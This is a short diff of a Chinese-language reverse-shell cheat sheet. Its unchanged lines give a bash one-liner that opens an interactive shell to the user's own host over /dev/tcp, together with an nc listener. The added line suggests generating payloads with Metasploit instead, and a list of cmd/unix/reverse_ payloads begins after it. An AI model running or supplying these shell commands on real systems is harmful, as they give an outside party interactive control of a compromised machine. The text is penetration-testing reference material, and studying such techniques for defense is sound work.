@@ -2,7 +2,7 @@
 /bin/bash -i >& /dev/tcp/<自己主机ip>/<监听端口> 0>&1
 nc -lvnp <监听端口>
 
-
+不想记忆的话直接用msf生成也可以：
 常见的基于 `cmd/unix/reverse_` 开头的完整有效反弹shell载荷选项及用法如下：
 
  1. `cmd/unix/reverse_bash`
